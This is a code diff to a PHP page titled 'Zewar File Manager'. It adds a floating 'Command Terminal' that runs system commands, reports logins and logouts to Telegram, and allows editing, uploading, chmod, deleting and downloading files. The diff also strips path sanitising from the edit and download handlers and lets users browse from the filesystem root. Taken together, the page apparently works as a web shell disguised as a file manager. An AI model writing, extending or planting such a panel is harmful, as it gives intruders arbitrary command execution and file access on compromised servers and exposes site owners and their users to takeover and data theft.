@@ -60,20 +60,46 @@ function get_client_ip() {
 // ============================================================
 function sanitize_path($path) {
     if (empty($path)) return false;
+    
+    // Remove null bytes
     $path = str_replace(chr(0), '', $path);
-    $realPath = realpath($path);
-    if ($realPath === false) {
-        $realPath = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
-        $realPath = preg_replace('/[\/\\\]+/', DIRECTORY_SEPARATOR, $realPath);
+    
+    // Normalize path separators
+    $path = str_replace('\\', '/', $path);
+    
+    // Remove double slashes
+    $path = preg_replace('#/+#', '/', $path);
+    
+    // Remove .. and . from path (security)
+    $parts = explode('/', $path);
+    $safe_parts = [];
+    foreach ($parts as $part) {
+        if ($part === '..') {
+            array_pop($safe_parts);
+        } elseif ($part !== '.' && $part !== '') {
+            $safe_parts[] = $part;
+        }
     }
     
+    $clean_path = '/' . implode('/', $safe_parts);
+    
+    // Forbidden directories check
     $forbidden = array('/etc/shadow', '/etc/passwd', '/etc/sudoers', '/root/', '/boot/');
     foreach ($forbidden as $dir) {
-        if (strpos($realPath, $dir) === 0 && strlen($dir) > 1) {
+        if (strpos($clean_path, $dir) === 0) {
             return false;
         }
     }
-    return $realPath;
+    
+    // Get real path if exists
+    if (file_exists($clean_path)) {
+        $realPath = realpath($clean_path);
+        if ($realPath !== false) {
+            return $realPath;
+        }
+    }
+    
+    return $clean_path;
 }
 
 function sanitize_filename($filename) {
@@ -232,6 +258,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$auth
         $_SESSION['auth'] = true;
         $_SESSION['login_time'] = time();
         $authenticated = true;
+        
+        // Set initial directory session
+        $_SESSION['fm_root'] = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
+        
         send_telegram('LOGIN', array('Status' => 'Success'));
         header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
         exit;
@@ -255,20 +285,71 @@ if (!$authenticated) {
     exit;
 }
 
+// Set File Manager Root Location (tempat file manager ini berada)
+if (!isset($_SESSION['fm_root'])) {
+    $_SESSION['fm_root'] = dirname(__FILE__);
+}
+$fm_root = $_SESSION['fm_root'];
+
 // ============================================================
-// Path Handling
+// Path Handling - FIXED
 // ============================================================
 $document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
-$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root;
-$current = sanitize_path($current);
+$document_root = str_replace('\\', '/', $document_root);
 
-if (!$current || !is_dir($current)) {
-    $current = $document_root;
+// Get current directory from parameter
+if (isset($_GET['d']) && !empty($_GET['d'])) {
+    $current = base64_decode($_GET['d']);
+    $current = str_replace('\\', '/', $current);
+    
+    // Security: prevent directory traversal
+    $real_current = realpath($current);
+    $real_root = realpath($document_root);
+    $real_fm_root = realpath($fm_root);
+    
+    if ($real_current !== false) {
+        // Allow navigation within document root OR fm root
+        $allowed = false;
+        if ($real_root !== false && strpos($real_current, $real_root) === 0) {
+            $allowed = true;
+        }
+        if ($real_fm_root !== false && strpos($real_current, $real_fm_root) === 0) {
+            $allowed = true;
+        }
+        
+        if ($allowed) {
+            $current = $real_current;
+        } else {
+            $current = $fm_root;
+        }
+    } else {
+        // If realpath fails, try to use the path as is but sanitize
+        $current = sanitize_path($current);
+        if (!$current || !is_dir($current)) {
+            $current = $fm_root;
+        }
+    }
+} else {
+    // Default to File Manager root location
+    $current = $fm_root;
 }
 
+// Final check - ensure current is a valid directory
+if (!is_dir($current)) {
+    $current = $fm_root;
+}
+
+// Normalize current path
+$current = str_replace('\\', '/', $current);
 @chdir($current);
+
+// Get parent directory
 $parent_dir = dirname($current);
-$can_go_up = ($parent_dir !== $current && $parent_dir !== false && $parent_dir !== '');
+$parent_dir = str_replace('\\', '/', $parent_dir);
+$can_go_up = ($parent_dir !== $current && $parent_dir !== '/' && $parent_dir !== false && is_dir($parent_dir));
+
+// Check if we can go back to FM root
+$can_go_to_fm_root = ($current !== $fm_root && is_dir($fm_root));
 
 // ============================================================
 // Process Actions
@@ -386,7 +467,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         $filename = base64_decode($_POST['edit_filename'] ?? '');
         $filename = sanitize_filename($filename);
         $current_dir = base64_decode($_POST['current_dir'] ?? '');
-        $current_dir = sanitize_path($current_dir);
+        $current_dir = str_replace('\\', '/', $current_dir);
         
         if ($filename && $current_dir && file_exists($current_dir . '/' . $filename)) {
             $filepath = $current_dir . '/' . $filename;
@@ -505,6 +586,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         exit;
     }
     
+    // Reset to FM Root
+    elseif (isset($_POST['reset_to_root'])) {
+        $message = "✅ Returned to File Manager root location";
+        $toast_type = 'success';
+        header("Location: ?d=" . base64_encode($fm_root));
+        exit;
+    }
+    
     // Logout
     elseif (isset($_POST['logout'])) {
         send_telegram('LOGOUT', array());
@@ -517,7 +606,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
 // Handle download
 if (isset($_GET['download']) && !empty($_GET['download'])) {
     $file = base64_decode($_GET['download']);
-    $file = sanitize_path($file);
+    $file = str_replace('\\', '/', $file);
     
     if ($file && file_exists($file) && is_file($file)) {
         $filename = $_GET['filename'] ?? basename($file);
@@ -547,10 +636,19 @@ if ($handle) {
         if ($item == '.' || $item == '..') continue;
         $full = $current . '/' . $item;
         $is_dir = is_dir($full);
-        $stat = stat($full);
-        $size = $is_dir ? '-' : format_size($stat['size']);
-        $perms = substr(sprintf('%o', $stat['mode']), -4);
-        $mtime = date('Y-m-d H:i:s', $stat['mtime']);
+        $stat = @stat($full);
+        if ($stat) {
+            $size = $is_dir ? '-' : format_size($stat['size']);
+            $perms = substr(sprintf('%o', $stat['mode']), -4);
+            $mtime = date('Y-m-d H:i:s', $stat['mtime']);
+        } else {
+            $size = '-';
+            $perms = '0000';
+            $mtime = '-';
+        }
+        
+        // Cek apakah file/directory writable
+        $is_writable = is_writable($full);
         
         $items[] = array(
             'name' => $item,
@@ -558,8 +656,9 @@ if ($handle) {
             'size' => $size,
             'perms' => $perms,
             'mtime' => $mtime,
-            'icon' => get_file_icon($item),
-            'link' => $is_dir ? '?d=' . base64_encode($full) : '#'
+            'icon' => get_file_icon($full),
+            'link' => $is_dir ? '?d=' . base64_encode($full) : '#',
+            'writable' => $is_writable
         );
     }
     closedir($handle);
@@ -570,12 +669,15 @@ usort($items, function($a, $b) {
     return strcasecmp($a['name'], $b['name']);
 });
 
-$display_path = $current;
-if (DIRECTORY_SEPARATOR == '\\') {
-    $display_path = str_replace('\\', '/', $current);
-}
-$path_parts = explode(DIRECTORY_SEPARATOR, $display_path);
+// Format path dengan benar menggunakan slash
+$display_path = str_replace('\\', '/', $current);
+$path_parts = explode('/', $display_path);
 $path_parts = array_filter($path_parts);
+
+// For root directory
+if (empty($path_parts)) {
+    $path_parts = ['/'];
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -583,6 +685,7 @@ $path_parts = array_filter($path_parts);
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zewar File Manager</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -622,9 +725,10 @@ $path_parts = array_filter($path_parts);
             flex-wrap: wrap;
             gap: 8px;
             background: #0f3460;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
         }
         .btn {
-            padding: 6px 14px;
+            padding: 8px 16px;
             border-radius: 5px;
             border: none;
             cursor: pointer;
@@ -632,26 +736,35 @@ $path_parts = array_filter($path_parts);
             transition: all 0.2s;
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            font-size: 0.8rem;
+            gap: 8px;
+            font-size: 0.85rem;
             text-decoration: none;
         }
         .btn-primary { background: #ffd700; color: #000; }
-        .btn-primary:hover { background: #ffed4a; }
+        .btn-primary:hover { background: #ffed4a; transform: translateY(-2px); }
         .btn-danger { background: #dc3545; color: #fff; }
-        .btn-danger:hover { background: #c82333; }
+        .btn-danger:hover { background: #c82333; transform: translateY(-2px); }
         .btn-outline { background: transparent; border: 1px solid #ffd700; color: #ffd700; }
-        .btn-outline:hover { background: rgba(255,215,0,0.1); }
+        .btn-outline:hover { background: rgba(255,215,0,0.1); transform: translateY(-2px); }
         .btn-up { background: #28a745; color: #fff; }
         .btn-root { background: #17a2b8; color: #fff; }
+        .btn-back { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; }
+        .btn-back:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(238,90,36,0.4); }
+        .btn-cmd { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; }
+        .btn-cmd:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102,126,234,0.4); }
+        
         .breadcrumb {
-            padding: 10px 15px;
+            padding: 12px 15px;
             background: #0f3460;
-            font-size: 0.75rem;
+            font-size: 0.85rem;
+            font-family: monospace;
+            word-break: break-all;
         }
         .breadcrumb a { color: #ffd700; text-decoration: none; }
         .breadcrumb a:hover { text-decoration: underline; }
-        .separator { margin: 0 3px; color: #aaa; }
+        .separator { margin: 0 5px; color: #ffd700; font-weight: bold; }
+        .current-path { color: #4caf50; font-weight: bold; }
+        
         .file-table { overflow-x: auto; }
         .file-table table { width: 100%; border-collapse: collapse; }
         .file-table th { padding: 10px 12px; text-align: left; background: #16213e; color: #ffd700; font-weight: 600; font-size: 0.75rem; }
@@ -659,21 +772,145 @@ $path_parts = array_filter($path_parts);
         .file-table tr:hover td { background: #0f3460; }
         .item-name { display: flex; align-items: center; gap: 8px; }
         .item-icon { font-size: 1.1rem; }
-        .item-link { color: #fff; text-decoration: none; }
-        .item-link:hover { color: #ffd700; }
+        
+        .item-name-writable { color: #4caf50; }
+        .item-name-readonly { color: #ffffff; }
+        .item-link-writable { color: #4caf50; text-decoration: none; }
+        .item-link-writable:hover { color: #6fbf6f; text-decoration: underline; }
+        .item-link-readonly { color: #ffffff; text-decoration: none; }
+        .item-link-readonly:hover { color: #ffd700; text-decoration: underline; }
+        
         .action-group { display: flex; gap: 5px; flex-wrap: wrap; }
         .action-btn {
             background: #0f3460;
             border: none;
-            padding: 3px 8px;
-            border-radius: 3px;
+            padding: 4px 10px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 0.65rem;
+            font-size: 0.7rem;
             color: #fff;
             transition: all 0.2s;
         }
-        .action-btn:hover { background: #ffd700; color: #000; }
-        .badge { display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: #0f3460; color: #ffd700; }
+        .action-btn:hover { background: #ffd700; color: #000; transform: translateY(-1px); }
+        .badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: #0f3460; color: #ffd700; }
+        .badge-writable { background: #4caf50; color: #fff; }
+        .badge-readonly { background: #0f3460; color: #ffd700; }
+        
+        .cmd-modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            width: 90%;
+            max-width: 800px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 20px;
+            border: 1px solid rgba(255,215,0,0.3);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            z-index: 1001;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .cmd-modal.active {
+            display: block;
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .cmd-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+        }
+        .cmd-overlay.active { display: block; }
+        .cmd-header {
+            padding: 20px 25px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px 20px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .cmd-header h3 {
+            color: #fff;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .cmd-close {
+            background: rgba(255,255,255,0.2);
+            border: none;
+            color: #fff;
+            font-size: 1.5rem;
+            cursor: pointer;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            transition: all 0.2s;
+        }
+        .cmd-close:hover { background: rgba(255,255,255,0.4); transform: rotate(90deg); }
+        .cmd-body { padding: 25px; }
+        .cmd-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .cmd-input-group input {
+            flex: 1;
+            padding: 12px 15px;
+            background: #0a0a0a;
+            border: 1px solid #667eea;
+            border-radius: 10px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        .cmd-input-group input:focus {
+            outline: none;
+            border-color: #764ba2;
+            box-shadow: 0 0 10px rgba(102,126,234,0.3);
+        }
+        .cmd-output {
+            background: #0a0a0a;
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            color: #0f0;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #333;
+        }
+        .cmd-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        .cmd-output::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 4px;
+        }
+        .cmd-output::-webkit-scrollbar-thumb {
+            background: #667eea;
+            border-radius: 4px;
+        }
+        .cmd-footer {
+            padding: 15px 25px;
+            background: #0f3460;
+            border-radius: 0 0 20px 20px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
         
         .modal {
             display: none;
@@ -746,43 +983,30 @@ $path_parts = array_filter($path_parts);
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
-        .command-panel {
-            background: #0a0a0a;
-            border-top: 1px solid #ffd700;
-            padding: 10px 15px;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
-        .command-input-group {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-        .command-input-group input {
-            flex: 1;
-            padding: 8px 12px;
-            background: #000;
-            border: 1px solid #ffd700;
-            border-radius: 5px;
-            color: #0f0;
-            font-family: monospace;
-        }
-        .command-output {
-            margin-top: 8px;
-            background: #000;
-            border-radius: 5px;
-            padding: 8px 12px;
-            font-family: monospace;
+        .loading { animation: pulse 1s ease-in-out infinite; }
+        
+        /* Location indicator */
+        .location-indicator {
+            background: linear-gradient(135deg, #1a1a2e, #0f3460);
+            padding: 8px 15px;
+            border-radius: 20px;
             font-size: 0.7rem;
-            color: #0f0;
-            max-height: 150px;
-            overflow-y: auto;
-            display: none;
-            white-space: pre-wrap;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
         }
-        .command-output.active { display: block; }
+        .location-indicator i { color: #ffd700; }
+        .location-indicator span { color: #4caf50; font-weight: bold; }
+        
         @media (max-width: 768px) {
             .toolbar { justify-content: center; }
             .stats { display: none; }
             .action-group { flex-wrap: wrap; }
+            .cmd-modal { width: 95%; }
         }
     </style>
 </head>
@@ -791,39 +1015,69 @@ $path_parts = array_filter($path_parts);
     <div class="header">
         <div class="header-content">
             <div class="logo">
-                <h1>📁 Zewar File Manager</h1>
+                <h1><i class="fas fa-folder-open"></i> Zewar File Manager</h1>
                 <p>Advanced Web File Management System</p>
             </div>
             <div class="stats">
                 <div class="stat"><div class="stat-value"><?php echo count($items); ?></div><div class="stat-label">Items</div></div>
                 <div class="stat"><div class="stat-value"><?php echo date('H:i:s'); ?></div><div class="stat-label">Server Time</div></div>
+                <div class="location-indicator">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>FM Root:</span> <?php echo basename($fm_root); ?>
+                </div>
             </div>
         </div>
     </div>
     
     <div class="toolbar">
-        <button class="btn btn-primary" onclick="showModal('uploadModal')">📤 Upload</button>
-        <button class="btn btn-primary" onclick="showModal('folderModal')">📁 New Folder</button>
-        <button class="btn btn-primary" onclick="showModal('fileModal')">📄 New File</button>
+        <button class="btn btn-primary" onclick="showModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
+        <button class="btn btn-primary" onclick="showModal('folderModal')"><i class="fas fa-folder-plus"></i> New Folder</button>
+        <button class="btn btn-primary" onclick="showModal('fileModal')"><i class="fas fa-file-plus"></i> New File</button>
+        <button class="btn btn-cmd" onclick="openCmdModal()"><i class="fas fa-terminal"></i> Terminal</button>
+        
+        <?php if ($can_go_to_fm_root): ?>
         <form method="post" style="display: inline;">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
-            <button type="submit" name="logout" class="btn btn-danger">🚪 Logout</button>
+            <button type="submit" name="reset_to_root" class="btn btn-back" title="Kembali ke lokasi file manager">
+                <i class="fas fa-undo-alt"></i> Back to FM Root
+            </button>
         </form>
-        <?php if ($can_go_up): ?>
-        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up">⬆ Parent Directory</a>
         <?php endif; ?>
-        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root">🏠 Document Root</a>
+        
+        <form method="post" style="display: inline;">
+            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
+            <button type="submit" name="logout" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </form>
+        
+        <?php if ($can_go_up): ?>
+        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up"><i class="fas fa-level-up-alt"></i> Parent Directory</a>
+        <?php endif; ?>
+        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root"><i class="fas fa-globe"></i> Document Root</a>
     </div>
     
     <div class="breadcrumb">
-        📂 
+        <i class="fas fa-folder-open"></i> 
         <?php 
         $breadcrumb_path = '';
-        foreach ($path_parts as $index => $part):
-            $breadcrumb_path .= ($index > 0 ? '/' : '') . $part;
-            $encoded = base64_encode($breadcrumb_path);
-            echo '<a href="?d=' . $encoded . '">' . htmlspecialchars($part) . '</a>';
-            if ($index < count($path_parts) - 1) echo '<span class="separator">/</span>';
+        $total_parts = count($path_parts);
+        $index = 0;
+        foreach ($path_parts as $part):
+            if ($part === '/') {
+                $breadcrumb_path = '/';
+                echo '<a href="?d=' . base64_encode('/') . '"><i class="fas fa-home"></i> Root</a>';
+            } else {
+                $breadcrumb_path .= ($index > 0 ? '/' : '') . $part;
+                $encoded = base64_encode($breadcrumb_path);
+                echo '<a href="?d=' . $encoded . '">' . htmlspecialchars($part) . '</a>';
+            }
+            if ($index < $total_parts - 1) {
+                echo '<span class="separator"><i class="fas fa-chevron-right"></i></span>';
+            } else {
+                if ($part !== '/') {
+                    echo '<span class="separator"> → </span><span class="current-path">' . htmlspecialchars($part) . '</span>';
+                }
+            }
+            $index++;
         endforeach;
         ?>
     </div>
@@ -832,38 +1086,49 @@ $path_parts = array_filter($path_parts);
         <table>
             <thead>
                 <tr>
-                    <th>Name</th>
-                    <th>Size</th>
-                    <th>Permissions</th>
-                    <th>Modified</th>
-                    <th>Actions</th>
+                    <th><i class="fas fa-file"></i> Name</th>
+                    <th><i class="fas fa-database"></i> Size</th>
+                    <th><i class="fas fa-lock"></i> Permissions</th>
+                    <th><i class="fas fa-calendar"></i> Modified</th>
+                    <th><i class="fas fa-cogs"></i> Actions</th>
                 </tr>
             </thead>
             <tbody>
                 <?php if (empty($items)): ?>
-                <tr><td colspan="5" style="text-align: center; padding: 40px;">📂 Directory is empty</td></tr>
+                <tr><td colspan="5" style="text-align: center; padding: 40px;"><i class="fas fa-folder-open"></i> Directory is empty</td></tr>
                 <?php else: ?>
                 <?php foreach ($items as $item): ?>
+                <?php 
+                    $text_class = $item['writable'] ? 'item-name-writable' : 'item-name-readonly';
+                    $link_class = $item['writable'] ? 'item-link-writable' : 'item-link-readonly';
+                    $badge_class = $item['writable'] ? 'badge-writable' : 'badge-readonly';
+                    $writable_status = $item['writable'] ? '<i class="fas fa-check-circle"></i> Writable' : '<i class="fas fa-ban"></i> Read Only';
+                ?>
                 <tr>
                     <td class="item-name">
                         <span class="item-icon"><?php echo $item['icon']; ?></span>
                         <?php if ($item['is_dir']): ?>
-                            <a href="<?php echo $item['link']; ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
+                            <a href="<?php echo $item['link']; ?>" class="<?php echo $link_class; ?>">
+                                <?php echo htmlspecialchars($item['name']); ?> <i class="fas fa-chevron-right" style="font-size:10px;"></i>
+                            </a>
                         <?php else: ?>
-                            <span><?php echo htmlspecialchars($item['name']); ?></span>
+                            <span class="<?php echo $text_class; ?>">
+                                <?php echo htmlspecialchars($item['name']); ?>
+                            </span>
                         <?php endif; ?>
+                        <small style="font-size:0.6rem; margin-left:8px; color:#888;"><?php echo $writable_status; ?></small>
                     </td>
                     <td><?php echo $item['size']; ?></td>
-                    <td><span class="badge"><?php echo $item['perms']; ?></span></td>
+                    <td><span class="badge <?php echo $badge_class; ?>"><?php echo $item['perms']; ?></span></td>
                     <td><?php echo $item['mtime']; ?></td>
                     <td class="action-group">
                         <?php if (!$item['is_dir']): ?>
-                            <button class="action-btn" onclick="editFile('<?php echo base64_encode($item['name']); ?>')">✏ Edit</button>
-                            <button class="action-btn" onclick="downloadFile('<?php echo base64_encode($current . '/' . $item['name']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')">📥 Download</button>
+                            <button class="action-btn" onclick="editFile('<?php echo base64_encode($item['name']); ?>')" title="Edit"><i class="fas fa-edit"></i> Edit</button>
+                            <button class="action-btn" onclick="downloadFile('<?php echo base64_encode($current . '/' . $item['name']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" title="Download"><i class="fas fa-download"></i> Download</button>
                         <?php endif; ?>
-                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')">✏ Rename</button>
-                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')">🔒 Chmod</button>
-                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')">🗑 Delete</button>
+                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')" title="Rename"><i class="fas fa-pencil-alt"></i> Rename</button>
+                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['perms']; ?>')" title="Chmod"><i class="fas fa-lock"></i> Chmod</button>
+                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')" title="Delete" style="background:#dc3545;"><i class="fas fa-trash"></i> Delete</button>
                     </td>
                 </tr>
                 <?php endforeach; ?>
@@ -871,14 +1136,30 @@ $path_parts = array_filter($path_parts);
             </tbody>
         </table>
     </div>
-    
-    <div class="command-panel">
-        <div class="command-input-group">
-            <span>💻</span>
-            <input type="text" id="cmd_input" placeholder="Execute system command (ls, pwd, whoami, etc.)" onkeypress="if(event.key==='Enter') executeCommand()">
-            <button class="btn btn-outline" onclick="executeCommand()">▶ Run</button>
+</div>
+
+<!-- Floating CMD Modal -->
+<div class="cmd-overlay" id="cmdOverlay" onclick="closeCmdModal()"></div>
+<div class="cmd-modal" id="cmdModal">
+    <div class="cmd-header">
+        <h3><i class="fas fa-terminal"></i> Command Terminal</h3>
+        <button class="cmd-close" onclick="closeCmdModal()">&times;</button>
+    </div>
+    <div class="cmd-body">
+        <div class="cmd-input-group">
+            <i class="fas fa-dollar-sign" style="color:#4caf50; font-size:1.2rem;"></i>
+            <input type="text" id="cmd_command" placeholder="Enter command (ls, pwd, whoami, etc.)" onkeypress="if(event.key==='Enter') executeCommandFloating()" autofocus>
+            <button class="btn btn-primary" onclick="executeCommandFloating()"><i class="fas fa-play"></i> Run</button>
         </div>
-        <div id="cmd_output" class="command-output"></div>
+        <div id="cmd_output_floating" class="cmd-output">
+            <i class="fas fa-info-circle"></i> Welcome to Terminal!<br>
+            Type your command and press Enter or click Run.<br>
+            <span style="color:#ffd700;">Example:</span> ls, pwd, whoami, php -v
+        </div>
+    </div>
+    <div class="cmd-footer">
+        <button class="btn btn-outline" onclick="clearCmdOutput()"><i class="fas fa-eraser"></i> Clear</button>
+        <button class="btn btn-danger" onclick="closeCmdModal()"><i class="fas fa-times"></i> Close</button>
     </div>
 </div>
 
@@ -886,13 +1167,13 @@ $path_parts = array_filter($path_parts);
 <div id="uploadModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>📤 Upload File</h3>
+            <h3><i class="fas fa-upload"></i> Upload File</h3>
             <button class="modal-close" onclick="closeModal('uploadModal')">&times;</button>
         </div>
         <form method="post" enctype="multipart/form-data">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <div class="modal-body">
-                <label>Select File:
+                <label><i class="fas fa-file"></i> Select File:
                     <input type="file" name="file" required>
                 </label>
             </div>
@@ -908,13 +1189,13 @@ $path_parts = array_filter($path_parts);
 <div id="folderModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>📁 Create New Folder</h3>
+            <h3><i class="fas fa-folder-plus"></i> Create New Folder</h3>
             <button class="modal-close" onclick="closeModal('folderModal')">&times;</button>
         </div>
         <form method="post">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <div class="modal-body">
-                <label>Folder Name:
+                <label><i class="fas fa-folder"></i> Folder Name:
                     <input type="text" name="folder_name" placeholder="my_new_folder" required>
                 </label>
             </div>
@@ -930,16 +1211,16 @@ $path_parts = array_filter($path_parts);
 <div id="fileModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>📄 Create New File</h3>
+            <h3><i class="fas fa-file-plus"></i> Create New File</h3>
             <button class="modal-close" onclick="closeModal('fileModal')">&times;</button>
         </div>
         <form method="post">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <div class="modal-body">
-                <label>File Name:
+                <label><i class="fas fa-file"></i> File Name:
                     <input type="text" name="file_name" placeholder="index.php" required>
                 </label>
-                <label>File Content (optional):
+                <label><i class="fas fa-code"></i> File Content (optional):
                     <textarea name="file_content" placeholder="Write your content here..."></textarea>
                 </label>
             </div>
@@ -955,17 +1236,17 @@ $path_parts = array_filter($path_parts);
 <div id="renameModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>✏ Rename Item</h3>
+            <h3><i class="fas fa-pencil-alt"></i> Rename Item</h3>
             <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
         </div>
         <form method="post">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <input type="hidden" name="old_name" id="rename_old">
             <div class="modal-body">
-                <label>Current Name:
+                <label><i class="fas fa-file"></i> Current Name:
                     <input type="text" id="rename_current" disabled style="opacity:0.7">
                 </label>
-                <label>New Name:
+                <label><i class="fas fa-pen"></i> New Name:
                     <input type="text" name="new_name" id="rename_new" required>
                 </label>
             </div>
@@ -981,23 +1262,24 @@ $path_parts = array_filter($path_parts);
 <div id="chmodModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>🔒 Change Permissions</h3>
+            <h3><i class="fas fa-lock"></i> Change Permissions</h3>
             <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
         </div>
         <form method="post">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <input type="hidden" name="item" id="chmod_item">
             <div class="modal-body">
-                <label>File/Folder:
+                <label><i class="fas fa-file"></i> File/Folder:
                     <input type="text" id="chmod_filename" disabled style="opacity:0.7">
                 </label>
-                <label>Permissions (Octal):
+                <label><i class="fas fa-key"></i> Permissions (Octal):
                     <input type="text" name="permission" id="chmod_perm" placeholder="0755" maxlength="4" required>
                 </label>
                 <div style="font-size:0.7rem; color:#aaa; margin-top:10px;">
-                    <strong>Common permissions:</strong><br>
+                    <strong><i class="fas fa-info-circle"></i> Common permissions:</strong><br>
                     0644 = Owner: read/write, Group: read, Others: read (files)<br>
-                    0755 = Owner: read/write/execute, Group: read/execute, Others: read/execute (folders)
+                    0755 = Owner: read/write/execute, Group: read/execute, Others: read/execute (folders)<br>
+                    0777 = Full access (not recommended)
                 </div>
             </div>
             <div class="modal-footer">
@@ -1012,15 +1294,15 @@ $path_parts = array_filter($path_parts);
 <div id="deleteModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h3>⚠ Confirm Delete</h3>
+            <h3><i class="fas fa-exclamation-triangle"></i> Confirm Delete</h3>
             <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
         </div>
         <form method="post">
             <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
             <input type="hidden" name="item" id="delete_item">
             <div class="modal-body">
-                <p>Are you sure you want to delete <strong id="delete_name"></strong>?</p>
-                <p style="color:#dc3545; font-size:0.8rem; margin-top:10px;">⚠ This action cannot be undone!</p>
+                <p><i class="fas fa-trash"></i> Are you sure you want to delete <strong id="delete_name"></strong>?</p>
+                <p style="color:#dc3545; font-size:0.8rem; margin-top:10px;"><i class="fas fa-warning"></i> This action cannot be undone!</p>
             </div>
             <div class="modal-footer">
                 <button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button>
@@ -1034,7 +1316,7 @@ $path_parts = array_filter($path_parts);
 function showToast(message, type) {
     let toast = document.createElement('div');
     toast.className = 'toast ' + type;
-    toast.innerHTML = message;
+    toast.innerHTML = '<i class="fas ' + (type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle') + '"></i> ' + message;
